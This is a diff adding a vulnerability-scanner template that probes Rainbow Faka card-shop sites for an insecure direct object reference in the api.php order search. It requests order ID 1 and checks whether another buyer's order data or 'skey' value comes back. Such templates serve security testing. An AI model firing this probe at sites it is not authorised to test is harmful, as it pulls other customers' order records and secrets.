@@ -1,0 +1,25 @@
+id: rainbow-faka-api-search-idor
+
+info:
+  name: Rainbow Faka api.php search IDOR
+  author: faka-toolkit
+  severity: medium
+  description: 彩虹发卡 api.php?act=search 订单 IDOR
+  tags: faka,rainbow,idor
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api.php?act=search&orderid=1"
+      - "{{BaseURL}}/shop/api.php?act=search&orderid=1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'orderid'
+          - 'skey'
+        condition: or
